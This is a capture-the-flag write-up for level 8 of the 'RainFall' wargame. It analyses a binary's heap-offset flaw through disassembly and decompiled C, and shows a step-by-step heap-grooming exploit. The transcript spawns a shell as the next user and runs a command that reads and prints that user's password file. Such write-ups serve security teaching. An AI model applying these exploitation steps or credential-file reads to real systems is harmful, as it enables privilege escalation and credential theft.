# Level 8 — Writeup: Heap Memory Grooming

## Vulnerability Analysis

By decompiling and analyzing the assembly of `level8`, we identify an infinite loop that acts as a simple command-line interface. It takes user input via `fgets` and compares it against four specific commands: `auth`, `reset`, `service`, and `login`.

### The Logic Flaw

The vulnerability lies in the disconnect between how memory is allocated for the `auth` command and how it is checked in the `login` command.

1. **`auth`**: Allocates exactly 4 bytes of heap memory and assigns it to a global pointer `auth`.
2. **`login`**: Checks a 4-byte integer located **32 bytes past the `auth` pointer**.

```assembly
   0x080486e2 <+382>:   mov    eax,ds:0x8049aac
   0x080486e7 <+387>:   mov    eax,DWORD PTR [eax+0x20]
   0x080486ea <+390>:   test   eax,eax
   0x080486ec <+392>:   je     0x80486ff <main+411>
   0x080486ee <+394>:   mov    DWORD PTR [esp],0x8048833
   0x080486f5 <+401>:   call   0x8048480 <system@plt> 
```
in c
```c
// Pointer arithmetic: auth is cast to a 4-byte int pointer. 
// Adding 8 moves it forward by 8 * 4 = 32 bytes.
if ( *((_DWORD *)auth + 8) ) {
    system("/bin/sh");
}

```


Because `auth` only allocated 4 bytes, `auth + 32` points completely outside of the `auth` memory chunk into unallocated heap space. If that space contains `0`, the check fails. We need to find a way to place non-zero data exactly 32 bytes after `auth`.

## The Exploitation Strategy: Heap Grooming

To win, we must manipulate the heap layout using the `service` command, which uses `strdup` (a function that calls `malloc` under the hood) to store a string.
```assembly
   0x08048678 <+276>:   lea    eax,[esp+0x20]
   0x0804867c <+280>:   mov    edx,eax
   0x0804867e <+282>:   mov    eax,0x8048825 ; this address point to the string "service"
   0x08048683 <+287>:   mov    ecx,0x6
   0x08048688 <+292>:   mov    esi,edx
   0x0804868a <+294>:   mov    edi,eax
   0x0804868c <+296>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   ...
   0x0804869f <+315>:   jne    0x80486b5 <main+337>
   0x080486a1 <+317>:   lea    eax,[esp+0x20]
   0x080486a5 <+321>:   add    eax,0x7
   0x080486a8 <+324>:   mov    DWORD PTR [esp],eax
   0x080486ab <+327>:   call   0x8048430 <strdup@plt>
```
```assembly
(gdb) x/s 0x8048825
0x8048825:       "service"
```
In 32-bit Linux, `malloc` chunks have an 8-byte metadata header and allocate user data in multiples of 8 bytes.

* When we call `auth `, `malloc(4)` gives us an 8-byte metadata header + 8 bytes of user space = **16 bytes total**. Let's say it returns address `0x804a008`.
* When we immediately call `service `, `strdup` allocates a new chunk right next to the previous one. It starts exactly 16 bytes later at `0x804a018`.
* The `login` check looks at `auth + 32`.
* Because the `service` buffer starts at `auth + 16`, the address `auth + 32` lands **exactly 16 bytes inside the `service` buffer!**

### Step-by-Step Execution

1. **Initialize the Heap:**
We type `auth ` to allocate the first 16-byte chunk. The `auth` pointer is now set (e.g., `0x804a008`).
2. **Groom the Adjacent Memory:**
We type `service` followed by a long string of characters. We need the string to be at least 17 characters long so that it fills the 16th byte of the buffer.
`service aaaaaaaaaaaaaaaaaaaa`
3. **Trigger the Shell:**
We type `login`. The program looks 32 bytes past `auth`, finds the `'a'` characters from our `service` string (which evaluate to non-zero), and pops a shell!

```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service aaaaaaaaaaaaaaa
0x804a008, 0x804a018 
login
$ whoami         
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$ 

```